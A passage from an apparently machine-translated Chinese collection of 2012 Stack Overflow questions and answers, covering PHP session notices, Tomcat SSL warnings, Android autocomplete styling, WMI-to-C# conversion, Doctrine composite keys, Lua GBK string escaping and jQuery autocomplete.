Notice: A session had already been started - ignoring session_start() in /data/www/kuponia.hu/docs/system/includes/library.inc.php on line 9  
Notice: Undefined index: PHP_AUTH_USER in /data/www/kuponia.hu/docs/system/includes/mainPLUS.php on line 52
Notice: Undefined index: mobile_access in /data/www/kuponia.hu/docs/system/includes/config.php on line 63
Notice: A session had already been started - ignoring session_start() in /data/www/kuponia.hu/docs/system/includes/fns.php on line 10
Notice: Undefined index: userid in /data/www/kuponia.hu/docs/system/includes/fns.php on line 11
Notice: Undefined index: fb_access_token in /data/www/kuponia.hu/docs/system/modules/facebook/facebook.php on line 6
Notice: Undefined index: userid in /data/www/kuponia.hu/docs/system/modules/facebook/facebook.php on line 37 
```

知道有什么问题吗？新的 API 密钥可以完美地与旧站点（当然是域更改）一起使用，但如果我尝试使用新域，仍然无法正常工作。我们非常迫切需要这个 Facebook 连接登录 API。请出主意！谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:52:26.043

在网上搜索了一下后，我发现了这个：
[http](http://www.ajaykumarsingh.com/php/notice-a-session-had-already-been-started-ignoring-session_start-in-on-line.html)
://www.ajaykumarsingh.com/php/notice-a-session-had-already-been-started-ignoring-session_start-in-on-line.html 而这个（实际上告诉你和第一个一样）：
[https](https://dmadan.wordpress.com/2011/12/05/notice-a-session-had-already-been-started-ignoring-session_start/)
://dmadan.wordpress.com/2011/12/05/notice-a-session-had-already-been-started-ignoring-session_start/ 希望它'会帮助你的。

概括：

> 当您的 PHP.INI 文件打开 session.autostart 时，会出现此问题。您需要通过编辑 PHP.INI 文件并将其设置为 off 和/或将`.htaccess`具有以下值的文件放在 web 目录的根目录中来关闭它：`php_flag session.auto_start 0`并`if (!isset($_SESSION)) session_start();`在代码中使用而不是`session_start();`.

刚刚注意到SO上也有很多类似的问题：
[https ://stackoverflow.com/search?q=A+session+had+already+been+started+-+ignoring+session_start%28%29](https://stackoverflow.com/search?q=A+session+had+already+been+started+-+ignoring+session_start%28%29)

# java - SSL 配置：在 tomcat 启动时找不到类（PureTLSImplementation，JSSE15Factory）

> ID：11427522
> 
> 赞同：0
> 
> 时间：2012-07-11T07:18:56.423
> 
> 标签：java, tomcat, classnotfoundexception, tomcat5.5

我正在使用 tomcat 5.5.30 并为 SSL.Functionality 配置相同的配置，但我在 tomcat 启动时遇到异常。

```
java.lang.ClassNotFoundException: Error loading SSL Implementation org.apache.tomcat.util.net.puretls.PureTLSImplementation :java.lang.ClassNotFoundException: class org.apache.tomcat.util.net.puretls.PureTLSImplementation not found.
    at org.apache.tomcat.util.net.SSLImplementation.getInstance(SSLImplementation.java:79)
    at org.apache.tomcat.util.net.SSLImplementation.getInstance(SSLImplementation.java:48)
    at org.apache.tomcat.util.net.SSLImplementation.getInstance(SSLImplementation.java:64)
    at org.apache.coyote.http11.Http11BaseProtocol.checkSocketFactory(Http11BaseProtocol.java:730)
    at org.apache.coyote.http11.Http11BaseProtocol.init(Http11BaseProtocol.java:121)
    at org.apache.catalina.connector.Connector.initialize(Connector.java:1002) 
```

和

java.lang.ClassNotFoundException：找不到类 org.apache.tomcat.util.net.jsse.JSSE15Factory。

**我已经在tomcat-util.jar**中检查了这些类，但这些类不存在。我确定我使用的是正确且兼容的 jar，这些 jar 在 tomcat 5.5.30 捆绑包中可用。

知道为什么我会遇到这个问题。这是tomcat中的错误吗？

请帮助。在此先感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-12T07:27:39.010

如果您启用了调试级别日志记录，您应该只看到这些消息。

第一条消息表明可选的 PureTLS SSL 实现不可用。这种集成的源代码仍然在源代码分发中，但 Tomcat 用户社区对它的兴趣太小，以至于它已经有一段时间没有以二进制文件的形式分发了。

第二条消息表明 Java 5 JSSE 工厂不可用。这是因为二进制发行版是使用 Java 1.4 构建的。您可以使用 Java 1.5 从源代码构建来获得这个工厂，尽管我非常怀疑您会注意到任何区别。

因此，Tomcat 将使用 Java 1.4 JSSE 工厂，这就是 SSL 仍然有效的原因。

更值得关注的应该是 5.5.30 [1] 中存在的已知安全漏洞，以及 Tomcat 5.5.x 将在不到 3 个月 [2] 内达到生命周期结束这一事实。现在是升级到 Tomcat 7 的好时机。

[1] [http://tomcat.apache.org/security-5.html#Fixed_in_Apache_Tomcat_5.5.30](http://tomcat.apache.org/security-5.html#Fixed_in_Apache_Tomcat_5.5.30)

[2] [http://tomcat.apache.org/tomcat-55-eol.html](http://tomcat.apache.org/tomcat-55-eol.html)

# android - AutoCompleteTextView 下拉列表中的项目不可见。如何改变它们的颜色..？

> ID：11427528
> 
> 赞同：11
> 
> 时间：2012-07-11T07:19:20.763
> 
> 标签：android, autocompletetextview

我制作了一个 AutoCompletetextView。AutoCompleteTextView 下拉列表中的项目不可见。如何更改这些项目的颜色。

这是它的外观：

![在此处输入图像描述](../Images/e7434e4bcb592cf254658f8fe905b125.png)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-11T10:03:20.210

为了控制您在自动完成视图中显示项目的方式，您必须在适配器中设置 textViewResourceId。您可以使用 ArrayAdapter 并`android.R.layout.simple_dropdown_item_1line`作为 textViewResourceId 提供，如下所示。

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,android.R.layout.simple_dropdown_item_1line, yourList);
AutoCompleteTextView autocompleteView = (AutoCompleteTextView) findViewById(R.id.autocomplete_box);
autocompleteView.setAdapter(adapter); 
```

或者

如果您想为显示的项目创建自己的样式，请创建一个`TextView`像这样作为根元素的 XML（让我们`my_custom_dropdown.xml`用黑色文本和白色背景命名）

```
<?xml version="1.0" encoding="utf-8"?>
<TextView 
    xmlns:android="http://schemas.android.com/apk/res/android" android:id="@+id/text"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" 
    android:textSize="20sp" 
    android:padding="5sp"
    android:textColor="@color/black"
    android:background="@color/white"/> 
```

然后参考适配器中的 xml，如下所示 -

```
ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,R.layout.my_custom_dropdown, yourList); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-07-23T13:43:03.110

只是要指出，使用`android.R.layout.simple_dropdown_item_1line`它会给你上面遇到的同样的问题。所以你最好`TextView`在一个`.xml`文件中创建你自己的。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-08-12T10:03:14.360

如果将代码从 更改`"android.R.layout.simple_list_item_1"`为 对您`"android.R.layout.simple_dropdown_item_1line"` **不起作用**，

您应该尝试在setContentView**之前编写此代码**

```
setTheme(android.R.style.Theme); 
```

它对我有用:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-06T07:14:01.337

只需使用`"android.R.layout.simple_list_item_1"`而不是`"android.R.layout.simple_dropdown_item_1line"`.....您的问题将得到解决... :)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-05-19T12:05:48.840

我创建了一个示例项目：[AutoCompleteTextViewAdapter(Github Repo)](https://github.com/dimitardanailov/AutoCompleteTextViewAdapter)

您需要实现以下源代码行：

**活动**

```
ArrayAdapter<String> myCustomAdapter = new ArrayAdapter<String>(this, R.layout.text_custom_view, countriesNames);

final AutoCompleteTextView textView = (AutoCompleteTextView) findViewById(R.id.auto_complete_text_view);
textView.setAdapter(myCustomAdapter); 
```

**带有自定义 TextView 的 XML**

```
<?xml version="1.0" encoding="utf-8"?>
<TextView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/country_name"
    style="@style/CustomTextView"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:singleLine="true" /> 
```

**最后结果**

![自动完成文本视图适配器](../Images/e703131d00af1b716d7b4f8f9effee2e.png)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-07-06T15:16:42.503

[这是答案，希望其他人会受益](http://www.outofwhatbox.com/blog/2010/11/android-simpler-autocompletetextview-with-simplecursoradapter/)

[http://www.outofwhatbox.com/blog/2010/11/android-simpler-autocompletetextview-with-simplecursoradapter/](http://www.outofwhatbox.com/blog/2010/11/android-simpler-autocompletetextview-with-simplecursoradapter/)

```
public class SelectState extends Activity {

final static int[] to = new int[] { android.R.id.text1 };  

    final static String[] from = new String[] { "state" };

    private TextView mStateCapitalView;
    private AutoCompleteTextView mStateNameView;
    private AutoCompleteDbAdapter mDbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mDbHelper = new AutoCompleteDbAdapter(this);
        setContentView(R.layout.selectstate);
        Button confirmButton = (Button) findViewById(R.id.confirm);
        confirmButton.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                setResult(RESULT_OK);
                finish();
            }
        });

        mStateCapitalView = (TextView) findViewById(R.id.state_capital);
        mStateNameView = (AutoCompleteTextView) findViewById(R.id.state_name);

        // Create a SimpleCursorAdapter for the State Name field.
        SimpleCursorAdapter adapter = 
            new SimpleCursorAdapter(this, 
                    android.R.layout.simple_dropdown_item_1line, null,
                    from, to);
        mStateNameView.setAdapter(adapter);

        // Set an OnItemClickListener, to update dependent fields when
        // a choice is made in the AutoCompleteTextView.
        mStateNameView.setOnItemClickListener(new OnItemClickListener() {
            public void onItemClick(AdapterView<?> listView, View view,
                        int position, long id) {
                // Get the cursor, positioned to the corresponding row in the
                // result set
                Cursor cursor = (Cursor) listView.getItemAtPosition(position);

                // Get the state's capital from this row in the database.
                String capital = 
                    cursor.getString(cursor.getColumnIndexOrThrow("capital"));

                // Update the parent class's TextView
                mStateCapitalView.setText(capital);
            }
        });

        // Set the CursorToStringConverter, to provide the labels for the
        // choices to be displayed in the AutoCompleteTextView.
        adapter.setCursorToStringConverter(new CursorToStringConverter() {
            public String convertToString(android.database.Cursor cursor) {
                // Get the label for this row out of the "state" column
                final int columnIndex = cursor.getColumnIndexOrThrow("state");
                final String str = cursor.getString(columnIndex);
                return str;
            }
        });

        // Set the FilterQueryProvider, to run queries for choices
        // that match the specified input.
        adapter.setFilterQueryProvider(new FilterQueryProvider() {
            public Cursor runQuery(CharSequence constraint) {
                // Search for states whose names begin with the specified letters.
                Cursor cursor = mDbHelper.getMatchingStates(
                        (constraint != null ? constraint.toString() : null));
                return cursor;
            }
        });
    }
} 
```

请检查 line **final static int[] to = new int[] { android.R.id.text1 };**

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-02-26T23:15:56.723

这是最简单的方法。创建您自己的 TextView xml 文件。例如 custom_textview.xml

```
 <?xml version="1.0" encoding="utf-8"?>
    <TextView xmlns:android="http://schemas.android.com/apk/res/android"
     android:id="@+id/tv"
     android:textColor="@color/font_content"
     android:padding="5sp"
     android:textSize="16sp"
     android:layout_width="match_parent"
     android:background="@drawable/any_background"
     android:singleLine="true"
     android:gravity="center"
     android:layout_height="match_parent"/> 
```

然后在你的活动中

```
 //Create adapter object
    ArrayAdapter<String> adpt = new ArrayAdapter<String>(context,R.layout.mytextview, what_ever_array_object_here);
    searchAutoComplete.setAdapter(adpt); 
```

# c# - 转换 JScript WMI C#

> ID：11427529
> 
> 赞同：0
> 
> 时间：2012-07-11T07:19:21.607
> 
> 标签：c#, reflection, wmi

我正在尝试使用 WMI 和 System.Management 库将以下代码转换为 C#。谁能指出我正确的方向或提供一些帮助。

```
var IMPORT_CHILDREN = 0; // Recursively imports the subkeys of the specified key. 
var IMPORT_INHERITED = 1; // Imports the inherited properties of the keys.  
var IMPORT_NODE_ONLY = 2; // Does not import subkeys from the specified file. 
var IMPORT_MERGE = 4; // Merges the imported keys into the existing configuration instead of completely replacing what is there. 

var strPassword = "ExportingPassw0rd"; 
var strFilePath = "C:\\exported.xml"; 
var strSourceMetabasePath = "/lm/logging/custom logging"; // As represented in the metabase.xml file. 
var strDestinationMetabasePath = "/lm/logging/custom logging"; // Can be different from the source. 
var intFlags = IMPORT_NODE_ONLY | IMPORT_INHERITED; // Import only the node with inherited properties. 

// Make connections to WMI, to the IIS namespace on MyMachine, and to the IIsComputer object. 
var locatorObj = new ActiveXObject("WbemScripting.SWbemLocator"); 
var providerObj = locatorObj.ConnectServer("MyMachine", "root/MicrosoftIISv2"); 
var computerObj = providerObj.get("IIsComputer='LM'"); 

// Call export method from the computer object. 
computerObj.Import(strPassword, strFilePath, strSourceMetabasePath, strDestinationMetabasePath, intFlags); 

// Print results. 
WScript.Echo("Imported the node in " + strFilePath + " to " + strDestinationMetabasePath); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T07:38:45.017

.net 4.0：

```
 dynamic locatorObj = Activator.CreateInstance(Type.GetTypeFromProgID(("WbemScripting.SWbemLocator")));
    dynamic providerObj = locatorObj.ConnectServer("MyMachine", "root/MicrosoftIISv2");  
    dynamic computerObj = providerObj.get("IIsComputer='LM'");

    computerObj.Import(strPassword, strFilePath, strSourceMetabasePath, strDestinationMetabasePath, intFlags); 
```

.net 3.5 及以下版本：

```
 var locatorObj = Activator.CreateInstance(Type.GetTypeFromProgID(("WbemScripting.SWbemLocator")));
    var providerObj = locatorObj._I("ConnectServer", "MyMachine", "root/MicrosoftIISv2");  
    var computerObj = providerObj._I("get", "IIsComputer='LM'");

    computerObj._I("Import", strPassword, strFilePath, strSourceMetabasePath, strDestinationMetabasePath, intFlags);  

public static class ReflectionHlp
{
  public static object _I(this object item, string name, params object[] args)
  {
    if (item == null)
      return null;
    return item.GetType().InvokeMember(name, BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.InvokeMethod, null, item, args);
  }

} 
```

# objective-c - Core Data 临时关系

> ID：11427531
> 
> 赞同：0
> 
> 时间：2012-07-11T07:19:23.697
> 
> 标签：objective-c, ios, core-data

自从我上次问一个问题以来，我得到了一些非常好的答案，我想我会再问一个！

我正在为我公司的代表开发一个 iPad 应用程序，以便他们在现场提交订单。所以我的应用程序有债务人、地址、产品和订单。所有债务人都有一个或多个从我们的 ERP 系统中提取的收货地址。其中一项要求是我们的代表可以仅为该订单创建自定义送货地址。因此，它不应该附加到债务人，并且不应该能够在该客户的未来订单中被选中。当订单被删除时，该地址也应该被删除。

一开始我想，好吧，让我们在订单表中创建那些收货地址字段。但这看起来很难看，因为它会复制现有 ERP 地址的现有信息。所以我想，也许，也许可以创建一个实体描述，它不存储在地址表中，而是保存在订单中的交货地址关系中。我不知道这是否有意义，但也许您可以对此有所了解，因为我无法弄清楚。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T12:50:40.273

通常的做法是将地址信息复制到订单对象中，因为即使后续订单的未来地址发生变化，它也必须保留原始地址。

# windows-phone-7 - 如何暂停 DispatchTimer？

> ID：11427532
> 
> 赞同：0
> 
> 时间：2012-07-11T07:19:25.253
> 
> 标签：windows-phone-7

如何在 WP7 中暂停计时器？在我的应用程序中，我想暂停和恢复计时器。但是 DispatcherTimer 只有启动和停止。如何暂停计时器？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T20:04:04.027

试试这个：定义一个全局变量：

```
private static DateTime EndTime { get; set; } 
```

然后，当按下 Start 按钮时，您进行以下检查以确定计时器是否已停止或暂停：

```
private void btnStartClick(object sender, RoutedEventArgs e)
{
    if (this.dispatcherTimer == null)
    {
        this.dispatcherTimer = new DispatcherTimer();
        this.dispatcherTimer.Interval = TimeSpan.FromMilliseconds(100);
        this.dispatcherTimer.Tick += new EventHandler(dispatcherTimer_Tick);
    }

    if (this.EndTime == DateTime.MinValue)
    {
        this.EndTime = DateTime.Now + (TimeSpan)this.timeSpan.Value;
    }

    this.dispatcherTimer.Start();
} 
```

接下来，当按下暂停按钮时，您可以停止计时器，因为下次按下开始按钮时，您将通过上述检查：

```
private void btnPauseClick(object sender, RoutedEventArgs e)
{
    this.dispatcherTimer.Stop();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:44:00.627

对于暂停/恢复功能，您必须将其构建到您的 Tick 处理程序中，启动和停止计时器。

如果您的计时器间隔约为 60 秒，请尝试以下操作：

```
dispatcher_Timer.Interval = TimeSpan.Fromseconds(30);

dispatcher_Timer.Tick += new EventHandler(dispatcherTimer_Tickon);

dispatcher_Timer.Start();

private void dispatcherTimer_Tickon(object sender, EventArgs e)
{
    dispatcher_Timer.Tick -= new EventHandler(dispatcherTimer_Tickon);
    // Do the work for 30 seconds and pause it using stop             
    dispatcher_Timer.Stop();

    dispatcher_Timer.Tick += new EventHandler(dispatcherTimer2_Tickon);
    dispatcher_Timer.Start();
}

private void dispatcherTimer2_Tickon(object sender, EventArgs e)
{
    dispatcher_Timer.Tick -= new EventHandler(dispatcherTimer2_Tickon);
    // Do the remaining work for 30 seconds and pause it using stop             
    dispatcher_Timer.Stop();
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:37:54.923

尝试将 IsEnabled 属性设置为 false 以停止它，然后在您希望它继续时返回 true。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-11T07:47:08.417

没有办法暂停计时器，然后让它从中断的地方继续。IsEnabled 只调用 Start 和 Stop。

您需要创建自己的计时器才能拥有此功能。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-12-04T02:16:10.957

试试这个代码：

```
public class DispatcherTimerEx : DispatcherTimer
{
    public new TimeSpan Interval
    {
        get => maxInterval;
        set => base.Interval = maxInterval = value;
    }

    public new bool IsEnabled
    {
        get => base.IsEnabled;
        set
        {
            if (value == base.IsEnabled)
                return;
            if (value)
                this.Start();
            else
                this.Stop();
        }
    }

    TimeSpan maxInterval;
    DateTime startTime = DateTime.MinValue;
    DateTime stopTime = DateTime.MinValue;

    public DispatcherTimerEx()
    {
        base.Tick += OnTick;
    }

    public DispatcherTimerEx(DispatcherPriority priority) : base(priority)
    {
        base.Tick += OnTick;
    }

    public DispatcherTimerEx(DispatcherPriority priority, Dispatcher dispatcher) : base(priority, dispatcher)
    {
        base.Tick += OnTick;
    }

    public DispatcherTimerEx(TimeSpan interval, DispatcherPriority priority, EventHandler callback,
        Dispatcher dispatcher) : base(interval, priority, callback, dispatcher)
    {
        base.Tick += OnTick;
    }

    public new void Start()
    {
        base.Start();
        startTime = DateTime.Now;
        stopTime = DateTime.MinValue;
    }

    void OnTick(object sender, EventArgs e)
    {
        startTime = DateTime.Now;
        if (base.Interval == maxInterval) return;

        base.Stop();
        base.Interval = maxInterval;
        base.Start();
    }

    public void Pause()
    {
        base.Stop();
        stopTime = DateTime.Now;
    }

    public void Resume()
    {
        if (startTime == DateTime.MinValue)
            startTime = DateTime.Now;

        if (stopTime == DateTime.MinValue)
        {
            base.Interval = maxInterval;
        }
        else
        {
            base.Interval = maxInterval - (stopTime - startTime);
            stopTime = DateTime.MinValue;
        }

        base.Start();
    }
} 
```

我在这里添加了`Puase()`方法`Resume()`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-05-12T19:21:25.760

你可以通过这个简单的技巧轻松地暂停 Dispatcher，如果你将时间间隔设置为零呢？

**这将暂停调度程序**

```
 dispatcherTimer.Interval.Subtract(dispatcherTimer.Interval); 
```

再次恢复 dispatchTimer 只需将时间跨度添加到 Interval。

```
dispatcherTimer.Interval = new TimeSpan(0, 0, 0, 5); // this will 
```

**或者**

```
dispatcherTimer.Interval = TimeSpan.FromMilliseconds(100); 
```

# javascript - insertBefore 在两个类名上

> ID：11427533
> 
> 赞同：0
> 
> 时间：2012-07-11T07:19:28.183
> 
> 标签：javascript

我的代码有问题。我正在创建新的 div，然后将它们插入到每个具有`time`and类的元素之前`time2`。不幸的是我的代码不起作用我得到 insertBefore is undefined 错误。我怀疑它是我的 for 循环，但我需要进一步的帮助。

```
window.onload = function () {
    var badges, timeOne, timeTwo, parentDiv;

    timeOne = document.getElementsByClassName("time");
    timeTwo = document.getElementsByClassName("time2");

    for (index = 0; index < timeOne.length; ++index) {
        badges = document.createElement("div");
        badges.id = "badges";
        parentDiv = timeOne.parentNode;
        parentDiv.insertBefore(badges, timeOne[index]);
    }

    for (index = 0; index < timeTwo.length; ++index) {
        badges = document.createElement("div");
        badges.id = "badges";
        parentDiv = timeTwo.parentNode;
        parentDiv.insertBefore(badges, timeTwo[index]);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:26:02.287

`timeOne`不是元素而是数组，所以它没有`parentNode`.

您可能想使用

```
parentDiv = timeOne[index].parentNode;
parentDiv.insertBefore(badges, timeOne[index]); 
```

为避免这些错误，我建议您为变量提供更有意义的名称。例如

```
var timeOneElements = document.getElementsByClassName("time"); 
```

# doctrine - Doctrine 2 何时使用复合键出错？

> ID：11427534
> 
> 赞同：3
> 
> 时间：2012-07-11T07:19:38.763
> 
> 标签：doctrine, doctrine-orm, composite-key

我最近正在阅读[`Doctrine 2`'s best practice](http://doctrine-orm.readthedocs.org/en/2.0.x/reference/best-practices.html)并被此阻止：

> **25.3\. 避免使用复合键**
> 即使 Doctrine 完全支持复合键，如果可能的话最好不要使用它们。复合键需要 Doctrine 进行额外的工作，因此出错的可能性更高。

我不明白的是：如果`"Doctrine fully supports composite keys"`，在处理这样的键时怎么会出错？

因此，我想以社区 wiki 的形式提出这个问题，希望它能帮助我们理解它们是什么`"probability of errors"`：

**您是否有示例可以分享您遇到的情况，即`Doctrine 2`没有很好地处理复合键/应有的情况？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T07:19:39.137

就我而言，我相信我已经遇到了一个非常基本的数据库模式的一些问题，该模式包含一个主键由 2 个外键组成的表：

![在此处输入图像描述](../Images/0e5561e3df80f975acd4ac24a1b437d7.png)

**当我生成模型时，`product_i18n`不会创建与实体对应的实体**：

```
$ php doctrine-module.php orm:convert-mapping --namespace="Dbi\Entity\\" \
--from-database --force annotation module/Dbi/src/
Processing entity "Dbi\Entity\Locale"
Processing entity "Dbi\Entity\Product"

$ php doctrine-module.php orm:generate-entities --generate-annotations=1 \
module/Dbi/src
Processing entity "Dbi\Entity\Locale"
Processing entity "Dbi\Entity\Product" 
```

然而，我相信我的[数据库架构](http://pastebin.com/Lhiw7Zpd)是正确创建的：

```
 PRIMARY KEY (`product_id`, `locale_id`) ,
  INDEX `fk_product_i18n_locale` (`locale_id` ASC) ,
  INDEX `fk_product_i18n_product` (`product_id` ASC) ,
  CONSTRAINT `fk_product_i18n_locale`
    FOREIGN KEY (`locale_id` )
    REFERENCES `mydb`.`locale` (`id` ),
  CONSTRAINT `fk_product_i18n_product`
    FOREIGN KEY (`product_id` )
    REFERENCES `mydb`.`product` (`id` ) 
```

此外，`Doctrine 2`'`Schema Manager`表明 Doctrine 似乎完美地理解了这种关系（`var_dump`输出已更改以使其更简洁：删除诸如`array`, `RECURSION`, `string`... 之类的东西）：

```
$em = $this->getServiceLocator()->get('doctrine.entitymanager.orm_default');
$sm = $em->getConnection()->getSchemaManager();
var_dump($sm->->listTables());

object(Doctrine\DBAL\Schema\Table)#290 (10) {
["_name":protected]=> "product_i18n"

["_indexes":protected]=>
  ["primary"]=>
    ["_columns":protected]=>
      [0]=> "product_id"
      [1]=> "locale_id"

["_fkConstraints":protected]=>
  ["fk_product_i18n_locale"]=>
  object(Doctrine\DBAL\Schema\ForeignKeyConstraint)#285 (9) {
    ["_localColumnNames":protected]=> "locale_id"
    ["_foreignTableName":protected]=> "locale"
    ["_foreignColumnNames":protected]=> "id"

  ["fk_product_i18n_product"]=>
  object(Doctrine\DBAL\Schema\ForeignKeyConstraint)#286 (9) {
    ["_localColumnNames":protected]=> "product_id"
    ["_foreignTableName":protected]=> "product"
    ["_foreignColumnNames":protected]=> "id" 
```

因此，我处于可以查询`product_i18n`表的模式，但由于未生成相应的实体模型而无法与该表交互的情况。

**更新：**正如所`user1136666`指出的：[已知问题和限制页面](http://docs.doctrine-project.org/projects/doctrine-orm/en/2.0.x/reference/limitations-and-known-issues.html)颂歌陈述如下：

> 尽管我们声明我们支持当前不包含外键作为主键列的复合主键。

解决方法是定义代理键并在外键上添加唯一约束，如下所示：

```
CREATE  TABLE IF NOT EXISTS `mydb`.`product_i18n` (
  `id` INT NOT NULL AUTO_INCREMENT ,
  `name` VARCHAR(45) NULL ,
  `description` TEXT NULL ,
  `created_at` DATETIME NULL ,
  `modified_at` DATETIME NULL ,
  `product_id` INT NOT NULL ,
  `locale_id` INT NOT NULL ,
  INDEX `fk_product_i18n_locale` (`locale_id` ASC) ,
  INDEX `fk_product_i18n_product` (`product_id` ASC) ,
  PRIMARY KEY (`id`) ,
  UNIQUE (`locale_id` , `product_id`),
  CONSTRAINT `fk_product_i18n_locale`
    FOREIGN KEY (`locale_id` )
    REFERENCES `mydb`.`locale` (`id` )
  CONSTRAINT `fk_product_i18n_product`
    FOREIGN KEY (`product_id` )
    REFERENCES `mydb`.`product` (`id` )
ENGINE = InnoDB; 
```

**功能请求： http: [//www.doctrine-project.org/jira/browse/DDC-1926](http://www.doctrine-project.org/jira/browse/DDC-1926)**

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-11T17:40:18.133

表 product_i18n 的问题是它没有主键。请尝试将`product_id`和设置`locale_id`为复合主键。Doctrine 2 将生成实体。原则 2 实体需要主键。

# python - lua加载字符串时中文字符吃掉其他字符

> ID：11427541
> 
> 赞同：3
> 
> 时间：2012-07-11T07:20:16.507
> 
> 标签：python, character-encoding, lua, escaping, double-quotes

当我**通过 loadstring 在 lua 中加载数据时**，一些神奇的中文字符会失败。

```
RawData = '{a="a朶b"}'
Data = loadstring("return " .. RawData)() 
```

那是因为：

*   "朵" 的 ascii char(gbk 编码) 为 0x96 0x5c
*   0x5c 是'\'，之后会转义所有内容。
*   所以，**'{a="a朵b"}'**变成 **'{a="a\150\b"}'**，\b 是错误的答案

那么，我永远不会得到正确的输出“a朵b”，“b”被“朵”吃掉......

**同样的引用问题发生在 python 中：**

```
exec("""print '''a朶b''' """) 
```

* * *

**在python中有一些方法可以处理这个问题：**

*   明确定义文件中的编码 - *- 编码：gbk -* -
*   使用 utf-8 进行字符串/文件编码

但是lua只支持标准C，有什么引用或转义的想法吗？

* * *

顺便说一句，这有效：

```
RawData = [=[ {a=[[a朶b]]} ]=]
return  loadstring("return " .. RawData)() .a 
```

但我必须更改原始 RawData，这是不可接受的。

**问题2：**

如何保持lua中的字符串不转义？（python 做得很好）

```
s  = "a朶b"
s1 = string.format("%q", s)    -- s escaped
return s                       -- s escaped
print(s)                       -- s escaped 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-11T11:17:29.367

[正如Lua 邮件列表](http://lua-list.2524044.n2.nabble.com/Future-plans-for-Lua-and-Unicode-td7581149.html)中所讨论的，Lua 可以很好地处理字符串文字中的 UTF-8。如果您可以将文件保存为 UTF-8，则 Lua 将没有问题。如果您以后需要使用 GBK 编码（例如将其保存在文件中或以编码提供网页），您可以使用[lua-iconv](http://luaforge.net/projects/lua-iconv/)库将 UTF-8 文字转换为 GBK：

```
local iconv = require "iconv"
local toGbk = iconv.new("GBK", "UTF-8")
function U2G(s) return toGbk:iconv(s) end

-- assuming the while file is saved in UTF-8, this will output the string in GBK
print(U2G "a朶b") 
```

您可以做的另一件事是在使用`loadstring`. 然后在将结果呈现给用户时不要忘记从 UTF-8 转换回来。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-11T07:39:26.787

在 0x5c 之前插入一个 '\' 怎么样？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T07:59:58.173

好吧，您的 RawData 只是编码不正确，我认为不值得添加一些“启发式”来猜测其中哪些是多字节或独立的一部分。您应该更改它的序列化程序（或通知他们的开发人员），在将它们放入序列化之前，他们应该转义 Lua 在其字符串中视为特殊的符号。在这种特殊情况下`\`，必须在将`\\`字符串添加到序列化之前将所有内容转换为。

如果您的数据源是用某种通用语言编写的，那么可能值得检查一下是否有现成的 Lua 序列化库可用。

# javascript - 自动完成不起作用

> ID：11427547
> 
> 赞同：0
> 
> 时间：2012-07-11T07:20:38.780
> 
> 标签：javascript, ajax, jquery-ui, autocomplete

我对 js 中的自动完成有疑问。下面的代码对我很有效：

```
$(function(){
    $( "#txtAuto" ).autocomplete({
        source: ["Choice1","Choice2"],
        minLength:2     
    });
}); 
```

但是，当我将其更改为下面的代码进行测试时，它并没有给我选择：

```
$(function(){
    $( "#txtAuto" ).autocomplete({
        source: function( request, response ){
            $.ajax({
                url: "test.ewd",
                success: function(data){
                    var res=data.match('\\[[^\\]]*]');
                    return ["Choice1", "Choice2"];                       
                }
            });
        },
        minLength:2     
    });
}); 
```

有人告诉我我在哪里做错了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-11T07:45:11.347

问题的核心是ajax-function是异步的。它不会与您的其余代码同时执行，而是在您的 ajax 请求的响应（可能需要 10-100 毫秒才能完成）可用时执行。

因此，您不能`return`从`success`-function 中获取值。相反，您必须将它们传递给`response`函数。像这样：

```
success: function(data) {
  var res=data.match('\\[[^\\]]*]');
  response(["Choice1", "Choice2"]);
} 
```

# image - 从数字图像中可以获得什么样的信息

> ID：11427548
> 
> 赞同：1
> 
> 时间：2012-07-11T07:20:39.587
> 
> 标签：image, image-processing, information-extraction

我在 picasa 中看到我们可以找到相机的详细信息和拍摄图像的日期。我想知道使用数字图像可以找到哪些其他信息。您知道任何可用于此目的的工具吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-11T07:26:09.307

EXIF 标签包含有关图像的附加信息： [维基百科“可交换图像文件格式”](http://en.wikipedia.org/wiki/Exchangeable_image_file_format)

这实际上取决于拍摄图像的图像和相机，但最常见的字段包括：日期、制造商、型号、方向、压缩、Flash 信息、GPS 信息（更新/更好的相机）等等。

有多种读取 EXIF 数据的工具： - 最简单的可能是 Windows 资源管理器本身（右键单击图像，您可以读取所有 EXIF 标签） - 更复杂的程序，如 Adob​​e Suite 也可用于读取 EXIF 数据.

